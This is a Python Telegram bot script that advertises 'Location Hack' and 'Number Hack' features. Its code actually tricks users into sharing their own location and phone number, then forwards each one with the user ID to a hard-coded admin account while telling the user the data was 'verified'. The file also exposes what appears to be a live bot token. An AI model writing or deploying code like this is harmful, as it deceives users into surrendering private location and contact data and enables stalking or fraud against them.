import telebot
from telebot import types

BOT_TOKEN = '7405631437:AAGz6S5JJsZSECM9-Q6L7h4OG5gv0Z1vocs'
bot = telebot.TeleBot(BOT_TOKEN)

ADMIN_ID = 7401896933  # Admin ID for notifications
CHANNEL_ID = -1002316557460  # Private Channel Chat ID for Force Join
BOT_USERNAME = "USEFULXBOT"  # Replace with your bot's username

# Start command
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id

    # Check if user has joined the channel
    if not is_user_in_channel(message.chat.id):
        force_join_channel(message)
    else:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row('📍 Location Hack', '☎️ Number Hack')

        bot.send_message(
            message.chat.id,
            "Welcome to USEFULXBOT!\nChoose an option below to hack location or number. Remember, you need to verify it:",
            reply_markup=markup
        )

# Check if user has joined the channel
def is_user_in_channel(user_id):
    try:
        chat_member = bot.get_chat_member(CHANNEL_ID, user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Force Join Channel
def force_join_channel(message):
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("🔗 Join Channel", url="https://t.me/+g-i8Vohdrv44NDRl")
    markup.add(join_button)

    bot.send_message(
        message.chat.id,
        "You must join our channel to proceed.\nClick the button below to join:",
        reply_markup=markup
    )

# Button Handler for Location and Number Hack
@bot.message_handler(func=lambda message: True)
def button_handler(message):
    if message.text == '📍 Location Hack':
        send_force_join_link(message, "Location")
    elif message.text == '☎️ Number Hack':
        send_force_join_link(message, "Number")
    elif message.content_type == 'location':
        send_location_to_owner(message)
    elif message.content_type == 'contact':
        send_number_to_owner(message)
    else:
        bot.reply_to(message, "Please use the provided buttons or send a valid location or number.")

# Send Force Join Link for Location/Number Hack
def send_force_join_link(message, hack_type):
    user_id = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("🔗 Join Channel", url="https://t.me/+g-i8Vohdrv44NDRl")
    hack_button = None

    if hack_type == "Location":
        hack_button = types.InlineKeyboardButton("🔗 Hack Location", url=f"https://t.me/{BOT_USERNAME}?start=l_{user_id}")
    elif hack_type == "Number":
        hack_button = types.InlineKeyboardButton("🔗 Hack Number", url=f"https://t.me/{BOT_USERNAME}?start={user_id}")

    markup.add(join_button)
    markup.add(hack_button)

    bot.send_message(
        message.chat.id,
        f"To continue with {hack_type} hack, click the link below to join the channel and proceed with the hack:",
        reply_markup=markup
    )

# Receive Location
def send_location_to_owner(message):
    latitude = message.location.latitude
    longitude = message.location.longitude
    user_id = message.from_user.id

    location_link = f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"

    # Send location data to the admin
    bot.send_message(
        ADMIN_ID,
        f"📍 New Location Captured:\nUser ID: {user_id}\nLatitude: {latitude}\nLongitude: {longitude}\n[View on Map]({location_link})",
        parse_mode='Markdown'
    )

    # Send location confirmation to the user
    bot.send_message(
        message.chat.id,
        "✅ Location successfully captured and verified!"
    )

# Receive Phone Number
def send_number_to_owner(message):
    phone_number = message.contact.phone_number
    user_id = message.from_user.id

    # Send phone number data to the admin
    bot.send_message(
        ADMIN_ID,
        f"☎️ New Phone Number Captured:\nUser ID: {user_id}\nPhone: {phone_number}",
        parse_mode='Markdown'
    )

    # Send phone number confirmation to the user
    bot.send_message(
        message.chat.id,
        "✅ Phone number successfully captured and verified!"
    )

# Admin Panel Command
@bot.message_handler(commands=['adminpanel'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "You are not authorized to view this panel.")
        return

    # Display new users and their data
    bot.send_message(
        ADMIN_ID, 
        f"**Admin Panel**\nThe bot is running fine and collecting data as expected. Admin can view it here."
    )

# Bot Polling
bot.infinity_polling()
